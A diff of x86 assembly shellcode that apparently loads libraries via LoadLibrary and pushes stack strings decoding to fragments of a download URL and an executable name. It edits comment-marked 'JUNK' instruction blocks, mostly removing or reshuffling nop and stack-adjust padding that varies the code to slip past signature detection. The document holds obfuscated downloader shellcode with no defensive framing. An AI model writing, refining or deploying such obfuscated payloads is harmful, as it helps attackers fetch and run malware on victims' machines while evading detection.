@@ -61,13 +61,7 @@ add esp, 0xc                           ; pop LoadLibrary
 sub esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
-inc esp
-nop
-and ebx, ebx                           ; JUNK!!
-nop
-dec esp
-dec esp
-dec esp                                ; END JUNK!!
+inc esp                                ; END JUNK!!
 pop ecx                                ; ECX = 0
 push eax                               ; EAX = LoadLibrary
 
@@ -143,13 +137,10 @@ push eax
 sub dword [esp + 3], 0x23
 push 0x616f6c6e
 and eax, eax                           ; JUNK!!
-add esp, 0x3                           ; START JUNK!!
+sub esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
-inc esp
-nop
-nop
-sub esp, 0x6                           ; END JUNK!!
+inc esp                                ; END JUNK!!
 push 0x776f446e
 push 0x69614d2f
 push 0x39362e32
@@ -214,13 +205,11 @@ mov al, 0x72
 push eax
 push 0x6564616f
 and eax, eax                           ; JUNK!!
-add esp, 0x7                           ; START JUNK!!
+sub esp, 0x7                           ; START JUNK!!
 inc esp
 inc esp
 inc esp
-nop
-nop
-sub esp, 10                           ; END JUNK!!
+add esp, 0x4                           ; END JUNK!!
 push 0x6c6e776f
 push 0x643a6578
 push 0x6e69614d                        ; JUNK!!
@@ -232,8 +221,6 @@ add esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
 inc esp
-nop
-nop
 sub esp, 0x6                           ; END JUNK!!
 push 0x64616f6c
 push 0x6e776f44
@@ -243,8 +230,6 @@ add esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
 inc esp
-nop
-nop
 sub esp, 0x6                           ; END JUNK!!
 push esp
 
@@ -265,8 +250,6 @@ add esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
 inc esp
-nop
-nop
 sub esp, 0x6                           ; END JUNK!!
 push 0x643a6578
 push 0x652e7265
@@ -279,8 +262,6 @@ add esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
 inc esp
-nop
-nop
 sub esp, 0x6                           ; END JUNK!!
 push 0x6e776f44
 push 0x6e69614d
@@ -299,8 +280,6 @@ add esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
 inc esp
-nop
-nop
 sub esp, 0x6                           ; END JUNK!!
 push 0x64616f6c
 push 0x6e776f44
@@ -313,8 +292,6 @@ add esp, 0x3                           ; START JUNK!!
 inc esp
 inc esp
 inc esp
-nop
-nop
 sub esp, 0x6                           ; END JUNK!!
 push esp
 
